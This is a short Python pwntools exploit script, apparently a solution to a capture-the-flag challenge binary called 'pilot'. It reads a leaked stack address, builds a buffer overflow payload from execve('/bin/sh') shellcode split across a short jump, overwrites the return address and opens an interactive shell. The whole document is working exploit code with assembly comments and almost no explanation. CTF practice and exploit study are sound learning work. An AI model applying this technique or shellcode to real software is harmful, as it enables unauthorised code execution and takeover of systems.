#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
p = process('./pilot')
# shellcode = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
# xor rdx, rdx
# mov rbx, 0x68732f6e69622f2f
# shr rbx, 0x8
# push rbx
# mov rdi, rsp
# push rax
# push rdi
# mov rsi, rsp
# mov al, 0x3b
# syscall
shellcode1 = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50'
# xor rdx, rdx
# mov rbx, 0x68732f6e69622f2f
# shr rbx, 0x8
# push rbx
# mov rdi, rsp
# push rax
shellcode1 += '\xeb\x18'
# jmp short $+18h
shellcode2 = '\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
# push rdi
# mov rsi, rsp
# mov al, 0x3b
# syscall
print p.recvuntil('Location:')
shellcode_address_at_stack = int(p.recvuntil('\n'), 16)
log.info('Leak stack address = %x', shellcode_address_at_stack)
payload = flat([
	shellcode1, 
	'\x00' * (0x28 - len(shellcode1)), 
	shellcode_address_at_stack, 
	shellcode2
])
print repr(payload)
p.sendline(payload)
p.interactive()
